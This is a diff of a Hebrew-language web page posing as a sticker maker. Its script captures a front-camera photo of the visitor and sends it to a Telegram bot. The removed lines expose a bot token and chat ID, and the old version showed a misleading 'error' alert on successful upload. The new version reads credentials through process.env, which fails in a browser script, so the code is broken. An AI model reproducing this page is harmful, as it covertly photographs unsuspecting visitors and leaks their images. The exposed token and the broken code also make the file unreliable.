@@ -29,21 +29,21 @@
 </head>
 <body>
     <h1>צור סטיקר</h1>
-    <button id="capture">צור סטיר</button>
+    <button id="capture">צור סטיקר</button>
 
     <script>
         const captureButton = document.getElementById('capture');
-        const telegramBotToken = "6796201688:AAEaRoA_O41-U24XQGIX5a4MK4lMyIjjeqg"; // החלף בטוקן של הבוט שלך
-        const telegramChatId = "7039130805";     // החלף ב-Chat ID שלך
+        
+        // שליפת משתנים סביבתיים
+        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;  // משתנה מאובטח
+        const telegramChatId = process.env.TELEGRAM_CHAT_ID;      // משתנה מאובטח
 
         captureButton.addEventListener('click', () => {
-            // הפעלת מצלמה קדמית וצילום ישיר
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                 .then(stream => {
                     const track = stream.getVideoTracks()[0];
                     const imageCapture = new ImageCapture(track);
 
-                    // צילום התמונה ושליחתה
                     imageCapture.takePhoto()
                         .then(blob => {
                             const formData = new FormData();
@@ -58,16 +58,15 @@
                         .then(response => response.json())
                         .then(data => {
                             if (data.ok) {
-                                alert("שגיאה");
+                                alert("הסטיקר נשלח בהצלחה");
                             } else {
-                                alert("אירעה שגיאה:אנא אשר גישה למצלמה " + data.description);
+                                alert("אירעה שגיאה: " + data.description);
                             }
                         })
                         .catch(err => {
                             alert("שגיאה: " + err.message);
                         })
                         .finally(() => {
-                            // עצירת המצלמה
                             stream.getTracks().forEach(track => track.stop());
                         });
                 })
